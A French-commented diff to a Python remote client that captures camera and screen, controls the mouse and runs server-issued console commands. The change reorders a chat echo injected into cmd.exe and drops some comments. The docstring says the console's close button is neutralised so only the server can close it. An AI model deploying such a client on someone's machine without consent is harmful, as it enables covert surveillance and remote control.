@@ -15,6 +15,14 @@ Fonctionnalités (toutes indépendantes) :
     neutralisé ; seul server_gui peut fermer la console.
 
 Compatible Windows et Linux (le chat n'est actif que sous Windows).
+
+CORRECTIFS v7 :
+  - _handle_user_chat : l'écho local "Toi: <msg>" est injecté AVANT
+    l'envoi réseau (retour visuel immédiat). L'injection porte le marqueur
+    MAGIC_EXTRA_INFO (voir console_windows.py), donc le hook ne la capte
+    pas et le '\r' atteint bien cmd.exe.
+  - Le hook ne bloque plus le thread : la ligne est déposée dans une file
+    et traitée par un thread dédié (voir console_windows.py).
 """
 
 import argparse
@@ -41,9 +49,9 @@ import numpy as np
 import requests
 
 try:
-    from mss import MSS as _MSS   # versions récentes de mss
+    from mss import MSS as _MSS
 except ImportError:
-    from mss import mss as _MSS   # anciennes versions
+    from mss import mss as _MSS
 
 try:
     from pynput.mouse import Button, Controller as _MouseController
@@ -179,10 +187,6 @@ def _open_camera() -> cv2.VideoCapture:
     return capture
 
 
-# ---------------------------------------------------------------------
-# Navigateur de localisation
-# ---------------------------------------------------------------------
-
 LOCATION_BROWSER_CANDIDATES_LINUX = (
     "google-chrome", "google-chrome-stable", "chromium", "chromium-browser",
     "microsoft-edge", "microsoft-edge-stable",
@@ -241,10 +245,6 @@ def _find_app_mode_browser() -> "str | None":
             return path
     return None
 
-
-# ---------------------------------------------------------------------
-# Capture d'écran : mss + replis Wayland
-# ---------------------------------------------------------------------
 
 def _detect_linux_session_type() -> str:
     return os.environ.get("XDG_SESSION_TYPE", "").lower()
@@ -468,10 +468,6 @@ class _RateLimiter:
             return slot - now
 
 
-# ---------------------------------------------------------------------
-# Console distante (CMD Commandes)
-# ---------------------------------------------------------------------
-
 class RemoteConsole:
     def __init__(self, server_url: str, device_id: str):
         self.server_url = server_url
@@ -608,10 +604,6 @@ class RemoteConsole:
                 pass
 
 
-# ---------------------------------------------------------------------
-# Client principal
-# ---------------------------------------------------------------------
-
 class CameraClient:
     def __init__(self, server_url: str, device_id: str, device_name: str):
         self.server_url = server_url
@@ -638,7 +630,6 @@ class CameraClient:
 
         self._remote_console = RemoteConsole(server_url, device_id)
 
-        # Titre ASCII pur pour que la fenêtre soit facile à retrouver.
         self._chat_console: "ChatConsole | None" = None
         if _HAS_CHAT_CONSOLE:
             self._chat_console = ChatConsole(
@@ -732,9 +723,6 @@ class CameraClient:
 
         # ------------------------------------------------------------------
         # Chat : CYCLE DE VIE **AVANT** LES MESSAGES.
-        # Si on traitait chat_message d'abord, le premier message qui suit
-        # un OPEN serait consommé (pop(0) côté serveur) alors que la console
-        # n'est pas encore ouverte → définitivement perdu.
         # ------------------------------------------------------------------
         chat_window_cmd = commands.get("chat_window")
         if self._chat_console is not None:
@@ -755,6 +743,24 @@ class CameraClient:
                 logger.exception("Erreur lors de l'injection du message chat : %s", exc)
 
     def _handle_user_chat(self, line: str) -> None:
+        """Appelée par le thread dispatcher de ChatConsole (PAS par le hook).
+        On affiche l'écho local immédiatement (retour visuel rapide), puis
+        on envoie au serveur. L'injection porte MAGIC_EXTRA_INFO, donc le
+        hook ne capte pas ce '\r' et cmd.exe exécute bien l'echo."""
+        try:
+            if self._chat_console is not None and self._chat_console.is_open():
+                safe = (
+                    line.replace("^", "^^")
+                    .replace("&", "^&")
+                    .replace("|", "^|")
+                    .replace("<", "^<")
+                    .replace(">", "^>")
+                    .replace('"', "'")
+                )
+                self._chat_console._send_text(f"echo Toi: {safe}\r", force=True)
+        except Exception as exc:
+            logger.exception("Erreur lors de l'affichage local du message chat : %s", exc)
+
         try:
             requests.post(
                 f"{self.server_url}/api/shell/result",
@@ -769,20 +775,6 @@ class CameraClient:
             pass
         except Exception as exc:
             logger.exception("Erreur lors de l'envoi du message chat : %s", exc)
-
-        try:
-            if self._chat_console is not None and self._chat_console.is_open():
-                safe = (
-                    line.replace("^", "^^")
-                    .replace("&", "^&")
-                    .replace("|", "^|")
-                    .replace("<", "^<")
-                    .replace(">", "^>")
-                    .replace('"', "'")
-                )
-                self._chat_console._send_text(f"echo Toi: {safe}\r", force=True)
-        except Exception as exc:
-            logger.exception("Erreur lors de l'affichage local du message chat : %s", exc)
 
     def _chat_window_is_open(self) -> bool:
         return self._chat_console is not None and self._chat_console.is_open()
